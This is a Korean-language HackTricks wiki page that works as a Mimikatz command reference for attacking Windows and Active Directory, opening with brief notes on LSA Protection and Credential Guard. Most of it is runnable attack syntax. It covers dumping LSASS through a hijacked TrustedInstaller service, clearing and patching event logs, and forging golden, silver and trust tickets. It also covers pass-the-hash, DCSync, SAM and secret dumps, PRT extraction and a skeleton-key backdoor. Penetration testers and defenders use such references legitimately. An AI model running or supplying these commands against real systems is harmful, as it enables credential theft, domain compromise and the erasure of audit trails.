# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**이 페이지는 [adsecurity.org](https://adsecurity.org/?page_id=1821)의 페이지를 기반으로 합니다**. 자세한 내용은 원문을 확인하세요!<sup>[[3]](#references)</sup>

## 메모리의 LM 및 평문

Windows 8.1 및 Windows Server 2012 R2부터 자격 증명 탈취를 방지하기 위한 중요한 조치가 구현되었습니다.

- **LM 해시와 평문 비밀번호**는 보안을 강화하기 위해 더 이상 메모리에 저장되지 않습니다. Digest Authentication을 비활성화하여 LSASS에 "평문" 비밀번호가 캐시되지 않도록 하려면 특정 레지스트리 설정인 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 설정해야 합니다.

- **LSA Protection**은 무단 메모리 읽기와 코드 삽입으로부터 Local Security Authority(LSA) 프로세스를 보호하기 위해 도입되었습니다. 이를 위해 LSASS를 보호된 프로세스로 표시합니다. LSA Protection을 활성화하려면 다음과 같이 합니다.
  1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_의 레지스트리에서 `RunAsPPL`을 `dword:00000001`로 설정합니다.
  2. 관리되는 장치 전체에 이 레지스트리 변경을 적용하는 Group Policy Object(GPO)를 구현합니다.

이러한 보호 기능이 있어도 Mimikatz 같은 도구는 특정 드라이버를 사용해 LSA Protection을 우회할 수 있습니다. 다만 이러한 작업은 이벤트 로그에 기록될 가능성이 높습니다.

최신 워크스테이션에서는 **도메인에 가입된 비-DC 시스템인 Windows 11 22H2 이상과 Windows Server 2025에서 Credential Guard가 기본적으로 활성화되어 있는 경우가 많고**, **새로 설치한 Windows 11 22H2 이상에서는 LSASS-as-PPL이 기본적으로 활성화되어 있으므로** 이 점이 더욱 중요합니다. 실제로 `sekurlsa::logonpasswords`는 과거의 공격 기법에서 예상했던 것보다 적은 정보를 제공하는 경우가 많아, 운영자는 점차 **오프라인 미니덤프**, **Kerberos 키 추출(`sekurlsa::ekeys`)**, 또는 **CloudAP/PRT 관련 모듈**로 전환하고 있습니다. 보호 기능에 대한 자세한 내용은 [Windows credentials protections](credentials-protections.md)를 확인하세요.

### SeDebugPrivilege 제거에 대응하기

관리자는 일반적으로 프로그램을 디버깅할 수 있는 SeDebugPrivilege를 갖고 있습니다. 공격자가 메모리에서 자격 증명을 추출할 때 흔히 사용하는 메모리 덤프를 무단으로 생성하지 못하도록 이 권한을 제한할 수 있습니다. 하지만 이 권한이 제거되더라도 TrustedInstaller 계정은 사용자 지정 서비스 구성을 사용해 메모리 덤프를 생성할 수 있습니다.

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

이를 통해 `lsass.exe` 메모리를 파일로 덤프한 다음, 다른 시스템에서 분석해 자격 증명을 추출할 수 있습니다:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz 옵션

Mimikatz에서 Event log tampering은 주로 두 가지 작업으로 이루어집니다. 이벤트 로그를 지우고, 새 이벤트가 기록되지 않도록 Event 서비스를 패치합니다. 아래는 이러한 작업을 수행하는 명령입니다.

#### 이벤트 로그 지우기

Mimikatz에는 `event::clear` 명령이 있습니다. 이 명령은 선택한 클래식 로그에 대해 Windows 이벤트 로그 지우기 API를 호출합니다. 기본값은 `Security`이며, `/log:`를 사용해 다른 로그를 선택할 수 있습니다. 로그를 지우려면 호출자에게 해당 권한이 필요합니다. 새 레코드가 기록되지 않도록 하는 `event::drop`과는 다릅니다.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### 실험적 기능: Event Service 패치

- **명령어**: `event::drop`
- 이 실험적 명령어는 Event Logging Service의 동작을 수정하여 새 이벤트가 기록되지 않도록 합니다.
- 예시: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 명령어는 Mimikatz가 시스템 서비스를 수정하는 데 필요한 권한으로 실행되도록 합니다.
- 그런 다음 `event::drop` 명령어가 Event Logging service를 패치합니다.

### Kerberos Ticket 공격

아래 명령어를 빠른 구문 참고용으로 사용하세요. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md)에 관한 전용 페이지에는 최신 AES/PAC/opsec 세부 사항이 설명되어 있습니다.

### Golden Ticket 생성

Golden Ticket을 사용하면 도메인 전체에서 다른 사용자로 가장할 수 있습니다. 주요 명령어와 매개변수는 다음과 같습니다.

- 명령어: `kerberos::golden`
- 매개변수:
  - `/domain`: 도메인 이름.
  - `/sid`: 도메인의 Security Identifier (SID).
  - `/user`: 가장할 사용자 이름.
  - `/krbtgt`: 도메인 KDC 서비스 계정의 NTLM 해시.
  - `/ptt`: 티켓을 메모리에 직접 주입합니다.
  - `/ticket`: 나중에 사용할 수 있도록 티켓을 저장합니다.

예시:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket 생성

Silver Ticket은 특정 서비스에 대한 액세스를 제공합니다. 주요 명령어와 매개변수:

- 명령어: Golden Ticket과 유사하지만 특정 서비스를 대상으로 합니다.
- 매개변수:
  - `/service`: 대상으로 지정할 서비스(예: cifs, http).
  - 기타 매개변수는 Golden Ticket과 유사합니다.

예시:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket 생성

Trust Ticket은 trust relationship을 활용해 도메인 간 리소스에 액세스하는 데 사용됩니다. 주요 명령어와 매개변수:

- 명령어: Golden Ticket과 유사하지만 trust relationship에 사용됩니다.
- 매개변수:
  - `/target`: 대상 도메인의 FQDN.
  - `/rc4`: trust account의 NTLM hash.

예:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Additional Kerberos Commands

- **티켓 나열**:

  - 명령: `kerberos::list`
  - 현재 사용자 세션의 모든 Kerberos 티켓을 나열합니다.

- **Pass the Cache**: `kerberos::ptc`는 MIT/Heimdal `.ccache` 파일을 읽으며, `.kirbi` 파일은 읽지 않습니다. 파일 경로를 위치 인수로 지정합니다: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt`는 `.kirbi` 파일 또는 해당 파일이 들어 있는 디렉터리를 읽습니다. `/ticket:`이 아닌 위치 경로를 지정합니다: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. 전체 워크플로는 [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md)을 참조하세요.<sup>[[6]](#references)</sup>

- **티켓 제거**:
  - 명령: `kerberos::purge`
  - 세션에서 모든 Kerberos 티켓을 제거합니다.
  - 충돌을 방지하기 위해 티켓 조작 명령을 사용하기 전에 유용합니다.

### Over-Pass-the-Hash / Pass-the-Key

`RC4`가 비활성화되어 있거나 불안정한 경우, Mimikatz는 NT hash만 사용하는 대신 **AES128/AES256 Kerberos 키**를 현재 로그온 세션에 패치할 수 있습니다. `sekurlsa::pth`를 NTLM 전용으로 취급하는 것보다 최신 도메인에 더 적합한 방법인 경우가 많습니다.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate`는 새 콘솔을 실행하는 대신 현재 프로세스를 재사용하므로, 같은 컨텍스트에서 `lsadump::dcsync` 같은 명령을 바로 실행할 때 유용합니다.

### Active Directory 변조

- **DCShadow**: AD 객체를 조작하기 위해 일시적으로 머신이 DC처럼 동작하게 합니다. [DCShadow](../active-directory-methodology/dcshadow.md)를 참조하세요.

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: 암호 데이터를 요청하기 위해 DC를 모방합니다. [DCSync](../active-directory-methodology/dcsync.md)를 참조하세요.
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 자격 증명 액세스

- **LSADUMP::LSA**: LSA에서 자격 증명을 추출합니다.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 컴퓨터 계정의 암호 데이터를 사용해 DC를 가장합니다.

  - _원래 컨텍스트에는 NetSync에 대한 특정 명령이 제공되지 않았습니다._

- **LSADUMP::SAM**: 로컬 SAM 데이터베이스에 액세스합니다.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: 레지스트리에 저장된 secrets를 복호화합니다.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 사용자의 새 NTLM hash를 설정합니다.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust 인증 정보를 가져옵니다.
  - `mimikatz "lsadump::trust" exit`

### 클라우드 자격 증명 / Entra ID

**Entra ID** 또는 **hybrid-joined** 호스트에서 `sekurlsa::cloudap`은 LSASS의 캐시에 저장된 **Primary Refresh Token (PRT)** 데이터를 노출할 수 있습니다. `ProofOfPossesionKey.KeyValue`는 DPAPI로 보호된 세션 키 blob이며, 이미 복호화된 키가 아닙니다.<sup>[[7]](#references)[[8]](#references)</sup> `/unprotect`를 사용하려면 `SYSTEM`으로 `dpapi::cloudapkd`를 실행하거나(예: 상승된 Mimikatz 세션에서 `token::elevate` 사용), 먼저 `sekurlsa::dpapi`로 Mimikatz의 키 캐시를 채워야 합니다. `privilege::debug`만으로는 DPAPI 호출자 컨텍스트가 전환되지 않습니다.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

첫 번째 명령의 **일치하는** `Context`와 `Derived Key`를 두 번째 명령에 복사하세요. 제공된 컨텍스트가 없으면 Mimikatz가 새 컨텍스트를 생성합니다. TPM으로 보호되는 키라도 Mimikatz는 원래 장치의 TPM을 사용해 서명 키를 파생할 수 있습니다. 평문 키를 내보낼 필요는 없지만, 파생 키 생성에 성공하면 브라우저 쿠키에 서명할 수 있습니다.<sup>[[7]](#references)</sup>

PRT 문자열만으로는 충분하지 않습니다. Microsoft Entra는 연결된 세션 키의 소유 증명을 요구하기 때문입니다.<sup>[[9]](#references)</sup> 다른 master key 옵션은 [DPAPI 키 복구](../windows-local-privilege-escalation/dpapi-extracting-passwords.md)를, cloud 측 체인은 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)를 참고하세요.

### 기타

- **MISC::Skeleton**: DC의 LSASS에 backdoor를 삽입합니다.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### 권한 상승

- **PRIVILEGE::Backup**: 백업 권한을 획득합니다.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: 디버그 권한을 획득합니다.
  - `mimikatz "privilege::debug" exit`

### 자격 증명 덤프

- **SEKURLSA::LogonPasswords**: 로그인한 사용자의 자격 증명을 표시합니다.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 메모리에서 Kerberos 티켓을 추출합니다.
  - `mimikatz "sekurlsa::tickets /export" exit`

### SID 및 토큰 조작

- **SID::add/modify**: SID와 SIDHistory를 변경합니다.

  - 추가: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - 수정: _원래 문맥에는 수정 명령이 따로 없습니다._

- **TOKEN::Elevate**: 토큰을 가장합니다.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 여러 RDP 세션을 허용합니다.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP 세션을 나열합니다.
  - _TS::Sessions에 대해 제공된 명령은 없습니다._

### Vault

- Windows Vault에서 비밀번호를 추출합니다.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz 모듈](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB와 Entra ID: 새로운 cache flow를 만나 보세요](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz 명령어 참조](https://adsecurity.org/?page_id=1821)
- [4] [Mimikatz event 모듈 소스 코드](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mimikatz ccache 모듈 소스 코드](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mimikatz Kerberos 모듈 소스 코드](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPI 구현](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Primary Refresh Token 자세히 살펴보기](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra Primary Refresh Token 보호](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
